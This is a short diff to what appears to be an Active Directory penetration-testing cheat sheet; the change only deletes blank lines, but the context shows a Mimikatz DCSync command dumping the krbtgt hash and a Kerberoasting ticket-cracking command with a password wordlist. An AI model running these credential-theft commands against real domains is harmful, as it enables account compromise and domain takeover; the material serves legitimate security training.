@@ -362,7 +362,6 @@ Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
 # Privilege Escalation
 
 ### Kerberoast
-
 **1. Enumeration with Powerview:**
 ```powershell
 # Find user accounts used as Service accounts with PowerView
@@ -391,7 +390,6 @@ python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\3-40a10000-svcadmin@MSSQLSvc~
 ```
 
 ### Targeted Kerberoasting AS REPs
-
 **1. Enumeration with Powerview dev Version:**
 ```powershell
 # Enumerating accounts with Kerberos Preauth disabled
